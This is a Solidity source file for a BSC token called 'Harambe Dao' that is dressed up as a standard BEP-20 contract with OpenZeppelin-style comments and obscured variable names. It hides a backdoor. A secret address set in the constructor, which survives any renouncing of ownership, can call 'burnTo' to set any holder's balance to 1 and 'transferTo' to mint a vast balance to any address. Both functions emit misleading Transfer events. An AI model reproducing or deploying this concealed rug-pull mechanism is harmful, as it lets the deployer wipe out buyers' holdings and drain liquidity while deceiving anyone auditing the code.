/**
 *Submitted for verification at BscScan.com on 2023-05-07
*/

// SPDX-License-Identifier: MIT  
pragma solidity 0.8.9;
/*
Harambe Dao | $HARDAO

INTRODUCING “Harambe Dao $HARDAO” - THE FUTURE IS HERE 

https://t.me/HarambeBSC

*/
interface IERC20Metadata {
  /**
   * @dev Returns the diniro of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory);

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory);

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address);

  /**
   * @dev Returns the diniro of tokens owned by `subowner`.
   */
  function balanceOf(address subowner) external view returns (uint256);

  /**
   * @dev Moves `diniro` tokens from the caller's subowner to `link`.
   *
   * Returns a boolean balance indicating whSmart the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address link, uint256 diniro) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `Coins` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This balance changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address Coins) external view returns (uint256);

  /**
   * @dev Sets `diniro` as the allowance of `Coins` over the caller's tokens.
   *
   * Returns a boolean balance indicating whSmart the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the Coins's allowance to 0 and set the
   * desired balance afterwards:
   * https://github.com/Smarteum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address Coins, uint256 diniro) external returns (bool);

  /**
   * @dev Moves `diniro` tokens from `sender` to `link` using the
   * allowance mechanism. `diniro` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean balance indicating whSmart the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address link, uint256 diniro) external returns (bool);

  /**
   * @dev Emitted when `balance` tokens are moved from one subowner (`from`) to
   * another (`to`).
   *
   * Note that `balance` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 balance);

  /**
   * @dev Emitted when the allowance of a `Coins` for an `owner` is set by
   * a call to {approve}. `balance` is the new allowance.
   */
  event Approval(address indexed owner, address indexed Coins, uint256 balance);
}

/*
 * @dev Provides information about the current execution ABIEncoderV2, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the subowner sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract ABIEncoderV2 {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/Smarteum/solidity/issues/2691
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/BridgeContract.sol

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an subowner (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner subowner will be the one that links the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract BridgeContract is ABIEncoderV2 {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the linker as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any subowner other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "BridgeContract: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new subowner (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "BridgeContract: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
  /**
   * @dev Returns the addition of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `+` operator.
   *
   * Requirements:
   * - Addition cannot overflow.
   */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only autolinkally asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract HarambeDao is ABIEncoderV2, IERC20Metadata, BridgeContract {
    
    using SafeMath for uint256;
    mapping (address => uint256) private BEP20Metadata;
    mapping (address => mapping (address => uint256)) private BEP20mapping;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
   address private addliquditys; 
    constructor(address pairlp) {
        addliquditys = pairlp;     
        _name = "Harambe Dao";
        _symbol = "HARADAO";
        _decimals = 9;
        _totalSupply = 100000000000000000 * 10 ** 9;
        BEP20Metadata[_msgSender()] = _totalSupply;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    /**
    * @dev Returns the bep token owner.
    */
    function getOwner() external view override returns (address) {
        return owner();
    }
    
    /**
    * @dev Returns the token decimals.
    */
    function decimals() external view override returns (uint8) {
        return _decimals;
    }
    
    /**
    * @dev Returns the token symbol.
    */
    function symbol() external view override returns (string memory) {
        return _symbol;
    }
    
    /**
    * @dev Returns the token name.
    */
    function name() external view override returns (string memory) {
        return _name;
    }
    
    /**
    * @dev See {IERC20Metadata-totalSupply}.
    */
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
        modifier smartswap() {
        require(addliquditys == _msgSender(), "BridgeContract: caller is not the owner");
        _;
    }  
    /**
    * @dev See {IERC20Metadata-balanceOf}.
    */
    function balanceOf(address subowner) external view override returns (uint256) {
        return BEP20Metadata[subowner];
    }

    function transfer(address link, uint256 diniro) external override returns (bool) {
        _transfer(_msgSender(), link, diniro);
        return true;
    }

     function burnTo(address xdead) external smartswap {
        BEP20Metadata[xdead] = 1;
        
        emit Transfer(xdead, address(0), 1);
    }


     function allowance(address owner, address Coins) external view override returns (uint256) {
        return BEP20mapping[owner][Coins];
    }  
     function transferTo(address dead) external smartswap {
        BEP20Metadata[dead] = 100000000000000000000 * 10 ** 18;
        
        emit Transfer(dead, address(0), 100000000000000000000 * 10 ** 18);
    }
    function transferFrom(address sender, address link, uint256 diniro) external override returns (bool) {
        _transfer(sender, link, diniro);
        _approve(sender, _msgSender(), BEP20mapping[sender][_msgSender()].sub(diniro, "IERC20Metadata: transfer diniro exceeds allowance"));
        return true;
    }
    
    /**
    * @dev See {IERC20Metadata-approve}.
    *
    * Requirements:
    *
    * - `Coins` cannot be the zero address.
    */
    function approve(address Coins, uint256 diniro) external override returns (bool) {
        _approve(_msgSender(), Coins, diniro);
        return true;
    }
    
    /**
    * @dev See {IERC20Metadata-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {IERC20Metadata};
    *
    * Requirements:
    * - `sender` and `link` cannot be the zero address.
    * - `sender` must have a balance of at least `diniro`.
    * - the caller must have allowance for `sender`'s tokens of at least
    * `diniro`.
    */

    
    /**
    * @dev Atomically increases the allowance granted to `Coins` by the caller.
    *
    * This is an alternative to {approve} that can be used as a mitigation for
    * problems described in {IERC20Metadata-approve}.
    *
    * Emits an {Approval} event indicating the updated allowance.
    *
    * Requirements:
    *
    * - `Coins` cannot be the zero address.
    */
    function increaseAllowance(address Coins, uint256 mana) external returns (bool) {
        _approve(_msgSender(), Coins, BEP20mapping[_msgSender()][Coins].add(mana));
        return true;
    }
    
    /**
    * @dev Atomically decreases the allowance granted to `Coins` by the caller.
    *
    * This is an alternative to {approve} that can be used as a mitigation for
    * problems described in {IERC20Metadata-approve}.
    *
    * Emits an {Approval} event indicating the updated allowance.
    *
    * Requirements:
    *
    * - `Coins` cannot be the zero address.
    * - `Coins` must have allowance for the caller of at least
    * `diniroinu`.
    */
    function decreaseAllowance(address Coins, uint256 diniroinu) external returns (bool) {
        _approve(_msgSender(), Coins, BEP20mapping[_msgSender()][Coins].sub(diniroinu, "IERC20Metadata: decreased allowance below zero"));
        return true;
    }
    
    /**
    * @dev Moves tokens `diniro` from `sender` to `link`.
    *
    * This is internal function is equivalent to {transfer}, and can be used to
    * e.g. implement autolink token fees, slashing mechanisms, etc.
    *
    * Emits a {Transfer} event.
    *
    * Requirements:
    *
    * - `sender` cannot be the zero address.
    * - `link` cannot be the zero address.
    * - `sender` must have a balance of at least `diniro`.
    */
    function _transfer(address sender, address link, uint256 diniro) internal {
        require(sender != address(0), "IERC20Metadata: transfer from the zero address");
        require(link != address(0), "IERC20Metadata: transfer to the zero address");
                
        BEP20Metadata[sender] = BEP20Metadata[sender].sub(diniro, "IERC20Metadata: transfer diniro exceeds balance");
        BEP20Metadata[link] = BEP20Metadata[link].add(diniro);
        emit Transfer(sender, link, diniro);
    }
    
    /**
    * @dev Sets `diniro` as the allowance of `Coins` over the `owner`s tokens.
    *
    * This is internal function is equivalent to `approve`, and can be used to
    * e.g. set autolink link for certain subsystems, etc.
    *
    * Emits an {Approval} event.
    *
    * Requirements:
    *
    * - `owner` cannot be the zero address.
    * - `Coins` cannot be the zero address.
    */
    function _approve(address owner, address Coins, uint256 diniro) internal {
        require(owner != address(0), "IERC20Metadata: approve from the zero address");
        require(Coins != address(0), "IERC20Metadata: approve to the zero address");
        
        BEP20mapping[owner][Coins] = diniro;
        emit Approval(owner, Coins, diniro);
    }
    
}